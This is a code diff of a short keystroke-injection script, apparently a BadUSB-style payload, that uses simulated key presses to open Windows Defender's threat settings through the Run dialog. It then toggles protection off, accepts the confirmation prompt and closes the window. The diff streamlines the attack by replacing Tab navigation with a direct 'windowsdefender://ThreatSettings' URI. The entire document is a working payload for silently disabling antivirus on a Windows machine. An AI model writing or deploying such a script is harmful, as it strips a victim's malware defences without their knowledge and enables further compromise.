@@ -1,32 +1,14 @@
 layout('us');
-press("GUI");
+press("GUI r");
 delay(500);
-type("windows security")
-delay(2500);
-press("ENTER");
-delay(600);
-press("TAB");
-delay(200);
-press("TAB");
-delay(200);
-press("DOWN");
+type("windowsdefender://ThreatSettings")
 delay(200);
 press("ENTER");
-delay(200);
-press("TAB");
-delay(200);
-press("TAB");
-delay(200);
-press("TAB");
-delay(200);
-press("TAB");
-delay(200);
-press("ENTER");
-delay(200);
+delay(1000);
 press("SPACE");
-delay(500);
+delay(1000);
 press("SHIFT TAB");
-delay(500);
+delay(200);
 press("ENTER");
 delay(500);
 press("ALT F4");
